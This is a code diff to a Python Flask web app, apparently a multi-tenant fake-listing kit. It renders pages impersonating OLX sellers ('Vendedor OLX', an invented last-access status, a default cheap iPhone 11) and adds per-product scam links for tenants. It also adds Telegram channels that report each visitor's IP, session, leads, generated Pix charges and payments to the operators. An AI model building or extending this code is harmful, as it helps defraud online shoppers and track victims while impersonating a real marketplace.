@@ -355,51 +355,70 @@ def get_whatsapp_config():
 # ─── ROUTES ───────────────────────────────────────────────────────────────────
 
 @app.route('/')
-@app.route('/p/<product_code>')
-def index(product_code=None):
+@app.route('/p/<slug_or_code>')
+@app.route('/p/<slug_or_code>/<item_code>')
+def index(slug_or_code=None, item_code=None):
     ip = _user_ip()
     ua = _user_ua()
     sid = str(uuid.uuid4())
 
-    p_code = product_code or request.args.get('p')
+    p_code = slug_or_code or request.args.get('p')
     tg_id = None
     slug = None
+    custom_item = None
 
     if TG_WH_AVAILABLE and p_code:
         tg_id = tg_wh.get_tg_id_by_slug(p_code)
         if tg_id:
             slug = p_code
+            if item_code:
+                custom_item = tg_wh.get_product_by_code(item_code)
+        else:
+            # Tenta buscar por código de produto direto
+            custom_item = tg_wh.get_product_by_code(p_code)
+            if custom_item:
+                tg_id = custom_item["tg_id"]
+                slug = tg_wh.get_slug(tg_id)
 
     if TG_WH_AVAILABLE and tg_id and slug:
-        # Checa limite de cliques/visitas do plano
         allowed, current_clicks, max_clicks = tg_wh.check_click_limit(tg_id)
         if not allowed:
             return f"<h1>Página Temporariamente Indisponível</h1><p>O limite mensal de visitas deste anúncio foi atingido ({current_clicks}/{max_clicks}). Contate o administrador.</p>", 429
 
-        # Registra sessão e evento no tenant
         tg_wh.record_tenant_session(tg_id, slug, sid, ip, ua[:200])
-        tg_wh.log_tenant_event(tg_id, slug, "PAGE_ENTRY", sid, ip, {"ua": ua[:200]})
+        tg_wh.log_tenant_event(tg_id, slug, "PAGE_ENTRY", sid, ip, {"ua": ua[:200], "item": item_code or "default"})
 
         cfgs = tg_wh.get_tenant_all_config(tg_id)
+        
+        # Se for um item específico do catálogo próprio do admin
+        p_name = custom_item["title"] if custom_item else cfgs.get("product_name", "iPhone 11 64GB Branco")
+        p_price = custom_item["price"] if custom_item else cfgs.get("product_price", "630.00")
+        p_old_price = custom_item["old_price"] if custom_item else cfgs.get("product_old_price", "")
+        p_desc = custom_item["description"] if custom_item else cfgs.get("product_description", "iPhone 11 em ótimo estado.")
+        p_img = (custom_item["image_url"] if custom_item and custom_item["image_url"] else cfgs.get("product_image", "/static/images/iphone11_1.jpg"))
+        p_img1 = (custom_item["image1"] if custom_item and custom_item["image1"] else p_img)
+        p_img2 = (custom_item["image2"] if custom_item and custom_item["image2"] else cfgs.get("product_image2", ""))
+        p_img3 = (custom_item["image3"] if custom_item and custom_item["image3"] else cfgs.get("product_image3", ""))
+
         return render_template(
             'index.html',
             session_id=sid,
             product_slug=slug,
-            product_name=cfgs.get("product_name", "iPhone 11 64GB Branco"),
-            product_price=cfgs.get("product_price", "630.00"),
-            product_old_price=cfgs.get("product_old_price", ""),
-            product_description=cfgs.get("product_description", "iPhone 11 em ótimo estado."),
-            product_image=cfgs.get("product_image", "/static/images/iphone11_1.jpg"),
-            product_image1=cfgs.get("product_image1", "/static/images/iphone11_1.jpg"),
-            product_image2=cfgs.get("product_image2", ""),
-            product_image3=cfgs.get("product_image3", ""),
+            product_name=p_name,
+            product_price=p_price,
+            product_old_price=p_old_price,
+            product_description=p_desc,
+            product_image=p_img,
+            product_image1=p_img1,
+            product_image2=p_img2,
+            product_image3=p_img3,
             seller_name=cfgs.get("seller_name", "Vendedor OLX"),
             seller_since=cfgs.get("seller_since", "Na OLX desde 2022"),
             seller_status=cfgs.get("seller_status", "Último acesso há 2 horas"),
             logo_url=cfgs.get("logo_url", ""),
             whatsapp={
                 "number": cfgs.get("whatsapp_number", "5511999999999"),
-                "message": cfgs.get("whatsapp_message", "Olá! Tenho interesse no anúncio.")
+                "message": cfgs.get("whatsapp_message", f"Olá! Tenho interesse no anúncio: {p_name}")
             }
         )
 
@@ -785,6 +804,85 @@ def api_admin_load_config():
     })
 
 
+# ─── CATÁLOGO DE MULTI-PRODUTOS POR ADMIN ────────────────────────────────────
+@app.route('/api/admin/my-products', methods=['GET', 'POST'])
+def api_admin_my_products():
+    """Listar ou criar produtos no catálogo próprio do admin logado."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+
+    if request.method == 'POST':
+        data = request.json or {}
+        title = data.get("title", "").strip()
+        price = data.get("price", "630.00").strip()
+        old_price = data.get("old_price", "").strip()
+        description = data.get("description", "").strip()
+        image_url = data.get("image_url", "").strip()
+        image1 = data.get("image1", "").strip()
+        image2 = data.get("image2", "").strip()
+        image3 = data.get("image3", "").strip()
+
+        if not title:
+            return jsonify({"ok": False, "error": "Título é obrigatório"}), 400
+
+        if TG_WH_AVAILABLE:
+            code = tg_wh.create_tenant_product(admin_id, title, price, old_price, description, image_url, image1, image2, image3)
+            slug = tg_wh.get_slug(admin_id)
+            unique_link = f"{BASE_URL}/p/{slug}/{code}" if slug else f"{BASE_URL}/p/{code}"
+            return jsonify({"ok": True, "product_code": code, "unique_link": unique_link, "message": "Produto criado no catálogo!"})
+
+    products = []
+    if TG_WH_AVAILABLE:
+        prods = tg_wh.get_tenant_products(admin_id)
+        slug = tg_wh.get_slug(admin_id)
+        for p in prods:
+            p["unique_link"] = f"{BASE_URL}/p/{slug}/{p['product_code']}" if slug else f"{BASE_URL}/p/{p['product_code']}"
+            products.append(p)
+
+    return jsonify({"ok": True, "products": products})
+
+
+@app.route('/api/admin/my-products/<product_code>', methods=['DELETE'])
+def api_admin_delete_product(product_code):
+    """Deletar produto do catálogo do admin."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+
+    if TG_WH_AVAILABLE:
+        tg_wh.delete_tenant_product(admin_id, product_code)
+        return jsonify({"ok": True, "message": "Produto excluído."})
+    return jsonify({"ok": False, "error": "Recurso indisponível"}), 400
+
+
+# ─── CANAIS DE LOGS CONFIGURÁVEIS DO ADMIN SUPREMO ───────────────────────────
+@app.route('/api/admin/supreme/log-channels', methods=['GET', 'POST'])
+def api_admin_supreme_log_channels():
+    """Configura ou obtém os canais de logs do Telegram (visita, lead, pix, pagamento)."""
+    admin_id, role = verify_admin_access(request)
+    if role != "supreme_admin":
+        return jsonify({"ok": False, "error": "Acesso restrito ao Admin Supremo"}), 403
+
+    if request.method == 'POST':
+        data = request.json or {}
+        channel_key = data.get("channel_key", "").strip()
+        chat_id     = data.get("chat_id")
+        title       = data.get("title", "").strip()
+
+        if not channel_key or not chat_id:
+            return jsonify({"ok": False, "error": "channel_key e chat_id são obrigatórios"}), 400
+
+        if TG_WH_AVAILABLE:
+            tg_wh.set_log_channel(channel_key, int(chat_id), title)
+            return jsonify({"ok": True, "message": f"Canal de logs {channel_key} configurado para chat {chat_id}!"})
+
+    channels = {}
+    if TG_WH_AVAILABLE:
+        channels = tg_wh.get_log_channels()
+    return jsonify({"ok": True, "channels": channels})
+
+
 @app.route('/api/admin/events')
 def api_admin_events():
     """Returns recent decrypted events from the encrypted DB."""
@@ -972,6 +1070,38 @@ def api_event():
             pass
 
     _log(event_type, session_id, payload)
+
+    if TG_WH_AVAILABLE:
+        slug = payload.get("slug") or request.args.get("slug", "global")
+        ip = _user_ip()
+        # Mapeia tipo de evento para canal específico
+        ch_key = {
+            "PAGE_ENTRY": "visita",
+            "CLICK_BUY": "cliques",
+            "LEAD_CAPTURED": "lead",
+            "PIX_GENERATED": "pix",
+            "PIX_PAID": "pagamento",
+            "PAYMENT_CONFIRMED": "pagamento"
+        }.get(event_type, "all")
+
+        title_map = {
+            "PAGE_ENTRY": "👁 Nova Visita no Anúncio",
+            "CLICK_BUY": "🛒 Clique em Comprar",
+            "LEAD_CAPTURED": "📝 Lead Capturado Real",
+            "PIX_GENERATED": "💸 Pix Gerado",
+            "PIX_PAID": "✅ Pagamento Confirmado!",
+            "PAYMENT_CONFIRMED": "✅ Pagamento Confirmado!"
+        }
+        ev_title = title_map.get(event_type, f"⚡ Evento: {event_type}")
+        msg_text = (
+            f"<b>{ev_title}</b>\n"
+            f"📦 <b>Slug:</b> <code>{slug}</code>\n"
+            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
+            f"🔑 <b>Session ID:</b> <code>{session_id[:12]}</code>\n"
+            f"⏱ <b>Data/Hora:</b> {time.strftime('%d/%m/%Y %H:%M:%S')}"
+        )
+        tg_wh.notify_log_channel(ch_key, msg_text)
+
     return jsonify({"ok": True})
 
 
